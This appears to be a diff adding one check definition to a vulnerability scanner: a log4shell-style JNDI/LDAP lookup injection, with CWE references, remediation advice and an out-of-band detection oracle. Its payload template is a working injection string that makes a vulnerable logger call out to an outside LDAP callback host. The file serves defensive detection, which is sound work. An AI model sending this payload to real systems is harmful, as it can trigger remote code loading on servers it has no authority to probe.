@@ -1,0 +1,21 @@
+{
+  "id": "m2-inj-deser-jndi-ldap",
+  "bug_class": "deserialization",
+  "title": "JNDI lookup injection (LDAP, log4shell-style)",
+  "severity": "Critical",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "${{jndi:ldap://{callback}/x}}"
+  },
+  "references": [
+    "CWE-502",
+    "CWE-917",
+    "CAPEC-586"
+  ],
+  "remediation": "Do not evaluate untrusted input as a lookup/expression and do not deserialize untrusted data into arbitrary types. Patch/limit JNDI lookups, use allowlist-based deserialization (or a data-only format like JSON with a fixed schema), and disable remote codebase loading. The inbound callback proves the lookup/gadget fired.",
+  "payload_family": "jndi-lookup"
+}
